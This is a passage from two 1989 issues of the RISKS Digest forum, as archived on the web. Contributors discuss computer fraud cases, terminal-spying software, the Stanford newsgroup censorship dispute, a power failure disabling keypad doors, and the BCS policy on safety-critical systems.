&lt;<A HREF="mailto:rsalz@BBN.COM">
rsalz@BBN.COM
</A>&gt;
</address>
<i>
23 Feb 89 00:19:10 GMT
</i><PRE>

&gt;... and the Zinn residence was raided by FBI agents, AT&amp;T/IBT security
&gt;representatives and Chicago Police detectives used for backup.

ATT security people as backup?  "Stop right there, this is the phone
company; hands against the wall!"  Is it common practice in such "raids"
to use outside companies?

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Reach Out and Spy on Someone
</A>
</H3>
<address>
Peter Scott 
&lt;<A HREF="mailto:PJS@naif.JPL.NASA.GOV">
PJS@naif.JPL.NASA.GOV
</A>&gt;
</address>
<i>
Thu, 23 Feb 89 10:41:46 PST
</i><PRE>

An article in _Digital Review_, February 20, under the title "Reach Out And
Help Someone" reviews a package for VAX/VMS called Video, from Performance
Software.  The subtitle says, "...system managers and training coordinators can
keep an eye on user activity".  Among other things, this package allows anyone
with appropriate privileges to see what anyone else is typing and receiving on
their terminal (passwords excepted, I suspect), or to "take over" another
terminal and broadcast their own commands to it.  You can also record terminal
sessions and play them back at leisure.

"With the Video Seer utility, system managers can monitor terminal sessions to
detect system abuse or simply to identify performance drains on their systems."

Oh joy.

[Funny aside: I just received a computer-printed letter for _Time_ Sweepstakes.
The first paragraph reads: "... Isn't it time you get that dream house for you
and your family in Burbank?  Isn't it time you started driving home to Box 6867
in that Mercedes-Benz you've had your eye on for years?..."  Don't they know
it's hard enough to fit myself into Box 6867, let alone park a Mercedes there?]

Peter Scott (pjs@grouch.jpl.nasa.gov)

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Power failure problems (RISKS 8.28)
</A>
</H3>
<address>
Jonathan I. Kamens 
&lt;<A HREF="mailto:jik@Athena.MIT.EDU">
jik@Athena.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 20 Feb 89 04:57:16 EST
</i><PRE>

In RISKS DIGEST 8.28, John Sinteur writes of his previous employers' problems
when the power went out and their magnetic card readers failed to work.

About nine days ago, a large part of Cambridge, including the entire MIT
campus, lost power for several hours as a result of a gas explosion in a
manhole.  One result of this was that all of Project Athena (The MIT
undergraduate computer system/research project) lost power, including all of
the workstation clusters.

The workstation clusters are all accessed by typing a combination into a
keypad outside the door of the cluster.  However, when the power went out, the
keypads all went dead and hence all of the doors could not be opened.

Nevertheless, the people who were sent around to power down all of the
workstations (so that when the power came back on things could be brought back
up gracefully) were able to get into most (if not all) of the clusters without
any trouble.  Students leaving the clusters after the power went out realized
that the keypads would not open the door, and therefore the last person out of
each cluster propped open the door with a garbage can.

I guess it didn't occur to them that this would allow anyone to walk onto
campus, walk into a computer cluster and steal every keyboard, mouse and chair
in the cluster (The computers themselves are locked down in all but one
cluster.).

(Then again, who would want all of those DEC and IBM keyboards and mice? :-)

Jonathan Kamens, MIT Project Athena, jik@Athena.MIT.EDU  Office: 617-253-4261

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
photographs as evidence (re: digital editing, etc.)
</A>
</H3>
<address>
Ernest H. Robl 
&lt;<A HREF="mailto:ehr@uncecs.edu">
ehr@uncecs.edu
</A>&gt;
</address>
<i>
Mon, 20 Feb 89 14:27:59 EST
</i><PRE>

Several of the photography trade publications carry regular columns on
"forensic photography" -- the making and use of photographs for evidence in
civil and criminal cases.  The authors of these columns usually stress that
photographs themselves are not sufficient for evidence, since such factors as
lighting, angle of view (particularly with the use of telephoto or wide angle
lenses), etc. can provide a quite different impression from what exists in
reality.

When photographs are introduced as evidence, the photographer is called as a
witness to testify that the pictures are a true representation of a particular
scene, object, etc.  The authors of these articles therefore stress the
importance of keeping related documentation about when, where, and how the
photographs were made, since this can come up during the trial.

Also related to the digital processing of images:  There's currently a fair
amount of coverage in the photographic trade press about another legal aspect
of electronically combined images -- namely who owns the rights to the final
product.  Since most commercial photographers sell *rights* to the use of their
images, rather than the physical transparency itself, this can get into a
sticky area, since some clients (particularly in advertising) will want
exclusive use of a particular image (and related images) for either a specific
time period or for a specific geographic area.  The current issue of
_Photomethods_, a journal for the audio-visual industry, has a questionnaire
asking photographers whether they feel digital manipulation of images is a help
or poses a threat.

     -- Ernest

My opinions are my own and probably not IBM-compatible.--ehr
Ernest H. Robl  (ehr@ecsvax)  (919) 684-6269 w; (919) 286-3845 h
Systems Specialist (Tandem System Manager), Library Systems,
027 Perkins Library, Duke University, Durham, NC  27706  U.S.A.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Stanford and rec.humor.funny -- risks in BBoards
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com">
minow%thundr.DEC@decwrl.dec.com
</A>&gt;
</address>
<i>
21 Feb 89 09:36
</i><PRE>

                     [Found this on a local bulletin board.    Martin Minow]

This is from the February 20, 1989, San Jose Mercury News:

Computer users worry that Stanford set precedent

They say decision to block bulletin board
impedes free acces to public information.

By Tom Philp

Computer scientists at Stanford fear the university has entered a never-ending
role as a moral regulator of computer bulletin boards by recently blocking
access to a list of jokes deemed to serve no "university educational purpose."
Many computer users on campus consider bulletin boards to be the libraries of
the future - and thus subject to the same free access as Stanford's library
system.  Instead, Stanford apparently has become the nation's first university
to block access to part of the international bulletin network called Usenet,
which reaches 250,000 users of computers running the Unix operating system,
according to a computer scientist who helped create the network.

To some computer users, Stanford's precedent is troubling.  "We get into some
very, very touchy issues when system administrators are given the authority to
simply get rid of files that they deem inappropriate on publicly available
systems," said Gary Chapman, executive director of Computer Professionals for
Social Responsibility, a Palo Alto-based organization with 2,500 members.  "My
personal view is that freedom of speech should apply to computer information."

Ralph Gorin, director of Academic Information Resources at Stanford, disagrees.
"I think that it's very clear that one should be either in favor of free speech
and all of the ramifications of that or be willing to take the consequences of
saying free speech sometimes, and then having to decide when," Gorin said.

Since the jokes ban, more than 100 Stanford computer users, including a leading
researcher in artificial intelligence, have signed a protest petition.  And
there is some evidence to indicate Stanford officials are looking for a way out
of the dilemma they have created.  

The joke bulletin board, called "rec.humor.funny," is one of several bulletin
boards that discuss controversial topics.  Stanford, for example, continues to
permit access to bulletin boards that allow students to discuss their use of
illegal drugs, sexual techniques and tips on nude beaches.  Gorin said he is
unaware of those bulletin boards.

The jokes bulletin board came to Stanford officials' attention in December,
after a report about it in a Canadian newspaper.  The jokes hit a raw nerve
with campus officials, who have been plagued by a variety of racist incidents
on campus.  And so they decided on Jan. 25 to block the jokes from passing
through the university's main computer.  "At a time when the university is
devoting considerable energy to suppress racism, bigotry and other forms of
prejudice, why devote computer resources to let some outside person exploit
these?"  Gorin explained.

The joke that sparked the complaints is this:  "A Jew and a Scotsman
had dinner in a restaurant.  At the end, the Scotsman was heard to say,
'I'll pay.'  The next day there was a newspaper headline, 'Jewish
Ventriloquist Murdered."  Most of the jokes are not racist or sexist, Gorin
said; they are just plain silly or political.  An example:  "What did Mickey
Mouse get for Christmas?  A Dan Quayle watch."

But Stanford officials were troubled because the jokes bulletin board is
"moderated," meaning that one person controls everything that it publishes.
The jokes bulletin board "does not in itself provide for discussion of the
issues that it raises," Gorin said.  The moderator, Brad Templeton of Waterloo,
in the Canadian province of Ontario, publishes only jokes.  Comments he
receives go on a separate bulletin board, called "rec.humor.d."  For Stanford,
the existence of a comment bulletin board is not enough because people who call
up the jokes will not necessarily see the comments.

The problem with "unmoderated" bulletin boards is clutter, according to Eugene
Spafford, a computer scientist at Purdue University who is one of the pioneers
of Usenet.  The network accumulates the equivalent of 4,000 double-spaced,
typewritten pages every day, far too many comments for any person to read.
"People who use a network as an information resource like a more focused
approach," Spafford said.  They is why another, unmoderated, bulletin board
that has many comments and fewer - but equally offensive - jokes, is far less
popular.  Stanford does not block transmission of that bulletin board.
Templeton's bulletin board is the most popular of the 500 on Usenet.  An
estimated 20,000 computer users pull up the jokes on their screens every day,
Spafford said.

Usenet has its own form of democracy, calling elections to determine whether a
new bulletin board should be created, and who - if anyone - should moderate it.
Templeton's jokes bulletin board was created by such a vote.  Stanford's
decision to block access to it "strikes me as hypocritical," Spafford said.
"At best, it's someone who doesn't understand the situation who is trying to do
something politically correct."

John McCarthy, a Stanford computer science professor and one of the founders of
the field of artificial intelligence, has met with university President Donald
Kennedy to discuss his opposition to blocking the jokes.  "No one of these
(bulletin boards) is especially important," McCarthy said.  The point is that
regulating access to them "is not a business that a university should go into."

Since deciding to block access to the bulletin board, the administration has
referred the issue to the steering committee of Stanford's Faculty Senate.  The
future of the bulletin board may end up in the hands of the professors.  "I
think that is an entirely appropriate internal process for reaching that
decision," Gorin said.

Added McCarthy:  "I should say that I am optimistic now that this ban will be
corrected.  There are some people who think they made a mistake."   ...

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.29.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.31.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-81</DOCNO>
<DOCOLDNO>IA013-000132-B046-449</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.31.html 128.240.150.127 19970217025755 text/html 25565
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:56:22 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 31</TITLE>
<LINK REL="Prev" HREF="/Risks/8.30.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.32.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.30.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.32.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 31</H1>
<H2> Monday 27 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Bank fraud was "easy" 
</A>
<DD>
<A HREF="#subj1.1">
Stephen Page
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Men accused of `hacker' crime 
</A>
<DD>
<A HREF="#subj2.1">
Michael C Polinske
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Stanford bboard censorship 
</A>
<DD>
<A HREF="#subj3.1">
Les Earnest
</A><br>
<A HREF="#subj3.2">
 John McCarthy
</A><br>
<A HREF="#subj3.3">
 Jerry Hollombe
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computer writing coach / friend 
</A>
<DD>
<A HREF="#subj4.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  British Computer Society policy on safety-critical systems 
</A>
<DD>
<A HREF="#subj5.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Reach out and spy 
</A>
<DD>
<A HREF="#subj6.1">
gls
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Risks of Running a Hotel 
</A>
<DD>
<A HREF="#subj7.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Singing in the Rain 
</A>
<DD>
<A HREF="#subj8.1">
Kent Borg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  [RISKS BARFMAIL] 
</A>
<DD>
<A HREF="#subj9.1">
PGN
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">

</A>
</H3>
<address>
Stephen Page 
&lt;<A HREF="mailto:sdpage@prg.oxford.ac.uk">
sdpage@prg.oxford.ac.uk
</A>&gt;
</address>
<i>
Sun, 26 Feb 89 10:03:38 gmt
</i><PRE>
Subject: Bank fraud was "easy"

From The Independent [London], 24 February 1989, p. 2:

"A 17-year-old junior cashier cheated the National Westminster Bank out of
1m pounds in a computer fraud, a court heard yesterday.  ...

Judge Helen Palin criticised the bank for lax security and refused to make
a compensation order for 15,000 pounds which the bank has not been able
to recover.

... After being given access to the bank's computer system he began by
paying 10 pounds into his own account. He then paid himself 12,000 in 
imaginary cheques. Later, he transferred a credit for 984,252 pounds
into the account of a friend ... and celebrated by buying 50 bottles of 
champagne.

... The judge said: "One of the worrying features of this case is that a
young man who hasn't long left school is able to work the system in the
NatWest bank on a number of occasions without being found out. Indeed, the
general chat within the bank seems to be how easy it is to defraud that
bank."

This is a good example of what ensues when system designers build weak
controls - or perhaps when users fail to implement them? Too often
in the IT community I hear security and controls described as dull and
uninteresting - anyone who has had the dreary job of producing a
risks/controls matrix will sympathise - but it should NEVER be
neglected. I'm glad the judge denied the compensation order.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Men accused of `hacker' crime
</A>
</H3>
<address>
Michael C Polinske 
&lt;<A HREF="mailto:mcp2@csd4.milw.wisc.edu">
mcp2@csd4.milw.wisc.edu
</A>&gt;
</address>
<i>
Mon, 27 Feb 89 10:12:07 CDT
</i><PRE>

This appeared in Friday, February 24th's _Milwaukee Journal_

2 MEN ACCUSED OF `HACKER' CRIME

By James Gribble of the Journal staff.

Vowing to step up efforts to stop computer crime, a Milwaukee County
prosecutor has charged two Milwaukee men with fraudulently obtaining
free long-distance telephone service.

The felony charges filed Thursday against Alan Carr, 35 and David
Kelsey, 26 are the first so-called hacker crimes to be prosecuted by
the district attorney's office.

Working independently, using home computers and similar software
programs, the men are alleged to have obtained calling card codes for
customers of an independent long-distance telephone company, Schneider
Communications.

They then used the codes to bill their personal calls to Schneider's
customers, according to a criminal complaint prepared by Asst. Dist.
Atty. Jon N. Reddin, head of the district attorney's White Collar
Crime Unit.

Reddin said the total theft probably was less than $1,000, but he
said the case reflected a growing problem.

"I have the feeling, from our investigation, that there's a lot of
people out there doing this," he said.  "The only way to stop it is to
prosecute them, because this is theft.  It's almost like some one
stealing your credit card and using it to make purchases."

Schneider Communications was the victim in this case, Reddin said,
because the company had to write off the customer billings for which
Carr and Kelsey turned out to be responsible.

According to court records and Reddin, the investigation was prompted
by a complaint from Schneider Communications.

The company's computer keeps track of all calls that are rejected
because of an improper access code.  Clients dialing incorrectly would
cause 10 to 30 rejected calls a month, but sometime last year the
number jumped to 1,000 or 2,000 per month.

Computer printouts showed the unknown parties were repeatedly dialing
the computer and changing the access code sequentially, Reddin said.
Hundreds of calls at a time were being made in this fashion, and each
time the code was changed one digit at a time until a working code was
encountered.

Because the company had no way of knowing where the calls were coming
from, Wisconsin Bell placed a tracing device on the line, through
which the calls were traced to the phone numbers of Carr and Kelsey.

The men were apparently unaware of each other and simply happened to
be involved in similar schemes, Reddin said.

Carr is alleged to have used a bootleg computer called "Hacking
Construction Set Documentation."  Kelsey is alleged to have used a
similar bootleg program called "Mickey-Dialer."  The programs were
seized in raids at the defendant's houses, according to court records.

Reddin acknowledged that technological safeguards can detect such
thefts after the fact but not prevent them.  What Carr and Kelsey are
alleged to have done can be done by any computer buff with the right
software and know-how, Reddin said.

The key to deterring computer crime, in Reddin's view, lies in it's
prompt reporting to authorities.

"The best way I can think of to do that is by filing a complaint with
our office," Reddin said.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Stanford bboard censorship
</A>
</H3>
<address>
Les Earnest
&lt;<A HREF="mailto:les@gang-of-four.stanford.edu ">
les@gang-of-four.stanford.edu 
</A>&gt;
</address>
<i>
25 Feb 89 01:57:48 GMT
</i><PRE>

Public accounts of the Stanford bboard censorship case, including the
San Jose Mercury News article that appeared in RISKS 8.30, give the
impression that the administration's ban on newsgroup rec.humor.funny
has been effective.  Nothing could be farther from the truth -- the
"banned" jokes continue to be available on all computers where they
were available before and are now more widely read than ever before.

Usenet newsgroups are stored on 9 primary distribution machines at
Stanford but are accessed via ethernet from hundreds of computers and
workstations on campus.  Two of these distribution machines were
affected by the administration's ban on rec.humor.funny.  The rest of
the system, which I organized several years ago, still carries all
newsgroups.

Since the "ban" began, every message from rec.humor.funny has been
cross-posted to another bboard at Stanford (su.etc) that goes to all
machines, including those that are supposed to be censored.  There has
been no move so far by the administration to deal with this "civil
disobedience."

Interestingly enough, the bureaucrats who decided to ban
rec.humor.funny didn't have the technical expertise to carry out their
intentions, so they came to the Computer Science Department for help.
This help was provided even though the individual involved disagreed
with what they were doing.

The Usenet primary feed for Stanford is under the control of the
Computer Science Department.  There was a plan to turn control over to
the administration but that plan has now been shelved.  The Computer
Science faculty voted this week to oppose newsgroup censorship.

Stanford's President Kennedy, who approved the original censorship
decision, is now carefully dancing around the issue and has agreed
that the Faculty Senate should review and decide on what the
University's policy should be.  It appears likely that the Senate will
agree with the Computer Science Department.

Les Earnest                                  Phone: 415 723-9729
Internet: Les@Sail.Stanford.edu              USMail: Computer Science Dept.
UUCP: . . . decwrl!Sail.Stanford.edu!Les             Stanford, CA 94305

</PRE>
<HR><H3><A NAME="subj3.2">
Stanford bboard censorship    
</A>
</H3>
<address>
&lt;<A HREF="mailto:John McCarthy <JMC@SAIL.Stanford.EDU>  [via <LES@SAIL.Stanford.EDU>]">
John McCarthy &lt;JMC@SAIL.Stanford.EDU&gt;  [via &lt;LES@SAIL.Stanford.EDU&gt;]
</A>&gt;
</address>
<i>
26 Feb 89  1343 PST
</i><PRE>

The following statement was passed unanimously at a meeting of the Computer
Science Department faculty on Tuesday, Feb 21, 1989.

Statement of Protest about the AIR Censorship of rec.humor.funny.

Computer scientists and computer users have been involved in making
information resources widely available since the 1960s.  Such resources are
analogous to libraries.  The newsgroups available on various networks are
the computer analog of magazines and partial prototypes of future universal
computer libraries.  These libraries will make available the information
resources of the whole world to anyone's terminal or personal computer.

Therefore, the criteria for including newsgroups in computer systems or
removing them should be identical to those for including books in or
removing books from libraries.  For this reason, and since the resource
requirements for keeping newsgroups available are very small, we consider it
contrary to the function of a university to censor the presence of
newsgroups in University computers.  We regard it as analogous to removing a
book from the library.  To be able to read anything subject only to cost
limitations is an essential part of academic freedom.  Censorship is not an
appropriate tool for preventing or dealing with offensive behavior.

We therefore think that AIR and SDC should rescind the purge of
rec.humor.funny.  The Computer Science Department has also decided not to
censor Department Computers.

</PRE>
<HR><H3><A NAME="subj3.3">

</A>
</H3>
<address>
The Polymath
&lt;<A HREF="mailto:hollombe@ttidca.tti.com ">
hollombe@ttidca.tti.com 
</A>&gt;
</address>
<i>
27 Feb 89 23:48:37 GMT
</i><PRE>
Subject: Censorship (Re: <A HREF="/Risks/8.30.html">RISKS-8.30</A>)

This is the same silly, emotional argument raised every time some form of
public or semi-public media refuses to carry someone's pet hobby horse.
If you throw out all the emotional baggage about "freedom of speech" and
"censorship", Stanford's decision not to carry rec.humor.funny is no more
illegal, unconstitutional or censorious then their (de facto) decision not
to sell hard-core pornography in the Student's Store.

Only governments can commit censorship, by prohibiting all access to a set
of facts.  Rec.humor.funny still exists and is still accessible.  Those at
Stanford who wish to continue accessing it will simply have to sign up with
a public access Unix site. (I believe the WELL is conveniently close, as are
one or two free-access sites).  Stanford is well within it's rights to
refuse to spend campus resources to support it.

The Polymath (aka: Jerry Hollombe, hollombe@ttidca.tti.com)  Citicorp(+)TTI
3100 Ocean Park Blvd.   (213) 452-9191, x2483
Santa Monica, CA  90405 {csun|philabs|psivax}!ttidca!hollombe

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Computer writing coach / friend
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
26 Feb 89 14:07:56 PST (Sunday)
</i><PRE>

From the "Bits and Bytes" page in 'Business Week' 6 March 89:

       A PROGRAM SWITCHES FROM THERAPIST TO WRITING COACH
  
  Sometimes talking over a subject with a friend can help you sort
  out your thoughts before you write a speech or business presentation.
  A Carrollton (Tex.) company called Xpercom now offers a computer-
  based "friend" for just that purpose -- a program called Thoughtline
  that runs on IBM personal computers and clones.  It's based on
  Joseph Weizenbaum's famous Eliza program, written in the early 
  1960s at MIT.  Named after the character in 'My Fair Lady,' Eliza
  could mimic the conversational skills of a psychotherapist so
  convincingly that many people believed it actually understood
  them as a human would and shared with it intimate details of their
  lives.  [See RISKS 8.17 and 8.18]  A shocked Weizenbaum ended up
  writing 'Computer Power and Human Reason,' a leading book on man's
  relationship to the computer.
  
  Thoughtline, selling for $295, works a lot like that.  It engages
  authors in written conversations about what they want to say, asking
  questions based on a script that it constantly adapts as each dis-
  cussion progresses.  It then spits out an outline based on what it
  has been told.  Just like its predecessor Eliza, though, Thoughtline
  "understands" nothing at all.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
British Computer Society policy on safety-critical systems
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mct@praxis.UUCP">
mct@praxis.UUCP
</A>&gt;
</address>
<i>
Thu, 23 Feb 89 16:34:20 BST
</i><PRE>

The BCS recently issued the following policy statement on safety-related
computer systems (SRCS) in an attempt to raise awareness of the special
problems created by programmable systems in safety-related applications.  The
policy attempts to steer a responsible course between the need to alert society
to the increasing risks from poorly-developed SRCS, and the need to avoid
creating irrational panic.

We would welcome constructive criticism of this policy from Risks readers.

[declaration of interest: I chair the BCS safety-critical systems group, and
wrote the policy statement. It was reviewed and amended by my colleagues in
the group before being approved as BCS policy by the Vice-President
(Professional), on behalf of the Professional Board.]

The complete text of the policy statement is given below. 


THE BRITISH COMPUTER SOCIETY, 13 Mansfield Street, London W1M 0BP	

BCS SAFETY CRITICAL SYSTEMS GROUP

Policy Statement on Safety-Related Computer Systems

PREAMBLE

Safety-Related Computer Systems (SRCS) are defined as those systems which, if
they go wrong, can lead directly to physical injury of humans.

In almost every case, the potential for injury lies in the system which the
SRCS is controlling or monitoring.  Assuring the safety of the total system
therefore involves several branches of engineering, depending on the
application.  Most industries are justifiably proud of their safety records.

POLICY

1 Computer systems, appropriately developed and deployed, can enhance the
safety of many processes and products, and bring other economic benefits.

2 The safety of a system is a system-wide issue, and the safety of a SRCS
cannot usefully be considered in isolation from the total system of which it
forms part.

3 Safety is a relative term; system safety can always be improved at increase
cost.  The developer therefore has to identify the level of adequate safety and
to develop all the subsystems so that this level is achieved overall.

4 The probability of error in a system increases with increasing complexity.
SRCS should be designed so that their complexity is kept to a minimum, and so
that they are isolated from interference from non safety-related subsystems.

5 SRCS should be developed and supported by suitably-qualified staff.

6 The quality of every SRCS should be the responsibility of a named engineer
within an accredited organisation who has up to date training and certification
in the relevant technologies.

7 Wherever possible, the methods used for developing, supporting and assessing
SRCS should be based on sound, scientific and mathematical principles.

8 There is urgent need for harmonisation of development standards for SRCS
between industries and internationally.  The BCS will work with the relevant
authorities to achieve this harmonisation.

9 The science and technology necessary to achieve and assess highly reliable
computer systems is not yet fully developed, and research and development are
therefore urgently needed.  The BCS calls upon the DTI and SERC to encourage
and support the necessary work.

10 In view of the limited experience with SRCS, the wide variation in
development methods, and the rapid growth in their use, the BCS calls for a
system of registration of SRCS, with mandatory fault reporting, so that minimum
standards can be enforced and data can be gathered which will allow the success
of different approaches to be assessed.

11 The BCS wishes to emphasise that there is no evidence that current SRCS pose
a serious threat to the public.  There is therefore no cause for alarm,
although action is urgently recommended on the points listed above.

Martyn Thomas, Chairman, BCS Safety Critical Systems Group
Martyn Thomas, Praxis plc, 20 Manvers Street, Bath BA1 1PX UK.
Tel:	+44-225-444700.   Email:   ...!uunet!mcvax!ukc!praxis!mct 

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Reach out and spy
</A>
</H3>
<address>
&lt;<A HREF="mailto:odyssey!gls@att.att.com">
odyssey!gls@att.att.com
</A>&gt;
</address>
<i>
Sun, 26 Feb  11:15:09 1989
</i><PRE>

The VAX/VMS "spying" package that Peter Scott describes in Risks Digest 8.30
has an old precedent.  Aiken C. C. got a Scientific Data Systems "Sigma"
time-sharing system around 1969, with terminals in several locations on the
Harvard campus.  A few months after it was installed I wrote an interactive
program called RADIO that monitored any other terminal in the system.

RADIO required no privilege, because the pages of system space that were mapped
into user memory included the terminal buffers for the whole system! RADIO made
a mockery of confidentiality, and since you could use it to monitor a login
sequence, it also made a mockery of authentication.  Incidentally, there was no
source code for RADIO.  Access to the assembler was restricted (as a security
feature), so I wrote the program in machine language using the debugger.

The staff at Aiken _eventually_ succeeded in destroying all copies of RADIO ...
but not without reluctance.  They had meanwhile learned the RADIO users'
practice of using two RADIOs to talk to each other.  If the facility of
"talking" seems useful now, it seemed miraculous then.  In those days computer
system engineers were careful to leave out any kind of "talking" facility for
fear of subjecting their systems to FCC regulations.

So far as I know, the only harm that RADIO did was to explode password
security.  If not for that it might have lived for years.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Risks of Running a Hotel
</A>
</H3>
<address>
Chuck Weinstock 
&lt;<A HREF="mailto:weinstoc@SEI.CMU.EDU">
weinstoc@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Mon, 27 Feb 89 09:55:33 EST
</i><PRE>

Those of you who have been ripped off by the alternative operator services
(AOS) that provide long distance telephone services to many hotels will be
interested in an article that appeared in Friday's Wall Street Journal.  It
seems that most hotels are neither equipped to bill 976 or 900 calls
properly nor to block them.  As more and more people discover this, the
hotels are finding they are getting interesting phone bills at the end of
the month!

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Singing in the Rain
</A>
</H3>
<address>
Kent Borg
&lt;<A HREF="mailto:kent@lloyd.UUCP ">
kent@lloyd.UUCP 
</A>&gt;
</address>
<i>
Fri, 24 Feb 89 15:07:03 EST
</i><PRE>

Not only have our eyes been the victims of trickery for years (Fred dancing on
the ceiling), but so have our ears: In the famous Singing in the Rain dance
scene we saw Gene Kelly get rather wet, but we were hearing Gwen Verden (sp?)
doing the tapping on the sound track (would that be foot syncing?).

(Ever notice how very well lit the `rain' drops were in that scene?  In real
life you often have to put your hand out to find out whether it is raining, in
the movies you can always *SEE* the rain.)

Hollywood has been using pictures and recordings to `lie' for years.  As a
famous camera man once said: "There is nothing natural about natural lighting."
The digital doctoring of photos is, in many ways, nothing new, just more
powerful.

Kent Borg

P.S. Deception has a long history: "But I *WATCHED* him saw her in two!!"

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
[RISKS BARFMAIL]
</A>
</H3>
<address>
&lt;<A HREF="mailto:The Mailer Daemon <Mailer@KL.SRI.COM>  [via PGN]">
The Mailer Daemon &lt;Mailer@KL.SRI.COM&gt;  [via PGN]
</A>&gt;
</address>
<i>
Mon, 27 Feb 89 12:30:19 PST
</i><PRE>

    [THIS HAS BEEN GOING ON FOR WEEKS NOW.  NO ONE HAS COMPLAINED.
